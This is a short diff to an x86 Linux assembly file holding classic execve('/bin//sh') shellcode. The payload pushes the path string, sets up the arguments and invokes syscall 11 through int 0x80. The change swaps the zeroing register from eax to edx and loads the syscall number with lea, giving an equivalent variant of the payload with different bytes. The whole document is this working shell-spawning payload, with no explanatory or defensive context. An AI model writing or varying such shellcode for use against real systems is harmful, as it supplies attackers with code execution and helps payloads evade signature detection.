@@ -3,13 +3,13 @@
 .section .text
 .global _start
 _start:
-	xor %eax,%eax
-	push %eax
+	xor %edx,%edx
+	push %edx
 	push $0x68732f2f
 	push $0x6e69622f
 	mov %esp,%ebx
-	push %eax
+	push %edx
 	push %ebx
 	mov %esp,%ecx
-	mov $0xb,%al
+	lea 0xb(%edx),%eax
 	int $0x80
